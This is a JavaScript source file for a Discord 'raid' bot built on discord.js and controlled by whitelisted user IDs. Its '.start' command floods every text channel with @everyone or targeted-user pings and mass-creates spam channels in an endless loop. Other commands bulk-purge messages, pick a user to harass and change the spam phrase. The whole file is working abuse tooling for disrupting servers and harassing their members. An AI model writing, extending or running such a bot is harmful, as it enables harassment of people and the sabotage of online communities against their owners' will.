import { Client, Events, GatewayIntentBits, PermissionFlagsBits } from 'discord.js';

const AUTHORIZED_USER_IDS = new Set(["1298640383688970293"]);
let isSpamming = false;
const createdChannelIds = new Set();
let spamPhrase = "Ghaith is king";
let targetedUserId = null;

const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ] 
});

client.once(Events.ClientReady, (c) => {
  console.log(`Ready! Logged in as ${c.user.tag}`);
});

client.on(Events.MessageCreate, async (message) => {
  if (message.author.bot) return;
  if (!AUTHORIZED_USER_IDS.has(message.author.id)) return;

  const content = message.content.trim();
  const args = content.split(/\s+/);
  const command = args[0].toLowerCase();

  // .recruit [user_id]
  if (command === '.recruit') {
    const targetId = args[1]?.replace(/[<@!>]/g, '');
    if (targetId) {
      AUTHORIZED_USER_IDS.add(targetId);
      message.reply(`User <@${targetId}> has been recruited.`).catch(() => {});
    }
    return;
  }

  // .revoke [user_id]
  if (command === '.revoke') {
    const targetId = args[1]?.replace(/[<@!>]/g, '');
    if (targetId) {
      AUTHORIZED_USER_IDS.delete(targetId);
      message.reply(`User <@${targetId}> has been revoked.`).catch(() => {});
    }
    return;
  }

  // .change [phrase]
  if (command === '.change') {
    const newPhrase = args.slice(1).join(' ');
    if (newPhrase) {
      spamPhrase = newPhrase;
      message.reply(`Spam phrase changed to: ${newPhrase}`).catch(() => {});
    }
    return;
  }

  // .choose [user_id]
  if (command === '.choose') {
    const target = args[1]?.replace(/[<@!>]/g, '');
    if (target) {
      targetedUserId = target;
      message.reply(`Targeted user set to <@${target}>.`).catch(() => {});
    } else {
      targetedUserId = null;
      message.reply("Targeted user cleared. Pinging @everyone.").catch(() => {});
    }
    return;
  }

  // .purge [amount]
  if (command === '.purge') {
    let amount = parseInt(args[1]);
    if (isNaN(amount)) amount = 100;
    if (amount <= 0) return message.reply('Specify a valid amount.').catch(() => {});

    try {
      // Small delay to ensure command message itself is included if possible
      await message.delete().catch(() => {});
      
      const deleteBatch = async (remaining) => {
        if (remaining <= 0) return;
        const toDelete = Math.min(remaining, 100);
        const deleted = await message.channel.bulkDelete(toDelete, true);
        if (deleted.size < toDelete) return; // Stop if we can't delete more
        if (remaining - deleted.size > 0) {
          await new Promise(r => setTimeout(r, 1000));
          await deleteBatch(remaining - deleted.size);
        }
      };

      await deleteBatch(amount);
      message.channel.send('Purge complete.').then(msg => {
        setTimeout(() => msg.delete().catch(() => {}), 3000);
      }).catch(() => {});
    } catch (err) {
      message.reply('Purge failed. Check permissions (Manage Messages) and message age (<14 days).').catch(() => {});
    }
    return;
  }

  // .start
  if (command === '.start') {
    if (isSpamming) return;
    isSpamming = true;
    const guild = message.guild;
    if (!guild) return;

    message.reply('Starting infinite raid...').catch(() => {});

    // Message Spam Loop
    const runSpam = async () => {
      while (isSpamming) {
        try {
          const channels = guild.channels.cache.filter(c => c.isTextBased());
          const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
          await Promise.all(channels.map(async (channel) => {
            if (!isSpamming) return;
            for(let i=0; i<5; i++) {
              if (!isSpamming) break;
              channel.send(`${mention} ${spamPhrase}`).catch(() => {});
            }
          }));
          await new Promise(r => setTimeout(r, 200));
        } catch (e) { if (!isSpamming) break; }
      }
    };

    // Channel Creation Loop
    const runChannelCreation = async () => {
      while (isSpamming) {
        try {
          const creations = [];
          for (let i = 0; i < 5; i++) {
            if (!isSpamming) break;
            creations.push(guild.channels.create({ name: spamPhrase, type: 0 }).then(channel => {
              createdChannelIds.add(channel.id);
              const mention = targetedUserId ? `<@${targetedUserId}>` : '@everyone';
              channel.send(`${mention} ${spamPhrase}`).catch(() => {});
            }).catch(() => {}));
          }
          await Promise.all(creations);
          await new Promise(r => setTimeout(r, 1000));
        } catch (e) { if (!isSpamming) break; }
      }
    };

    runSpam();
    runChannelCreation();
    return;
  }

  // .stop
  if (command === '.stop') {
    isSpamming = false;
    message.reply('Stopping and cleaning up...').catch(() => {});
    const guild = message.guild;
    if (guild) {
      (async () => {
        const toDelete = Array.from(createdChannelIds);
        createdChannelIds.clear();
        for (const id of toDelete) {
          try {
            const channel = await guild.channels.fetch(id);
            if (channel) await channel.delete();
          } catch (e) {}
        }
        const pattern = spamPhrase.toLowerCase().replace(/\s+/g, '-');
        const suspicious = guild.channels.cache.filter(c => c.name.includes('ghaith') || c.name === pattern);
        for (const [_, c] of suspicious) {
          try { await c.delete(); } catch (e) {}
        }
      })().catch(console.error);
    }
    return;
  }
});

client.login(process.env.DISCORD_TOKEN).catch(err => {
  console.error('Login failed:', err.message);
});
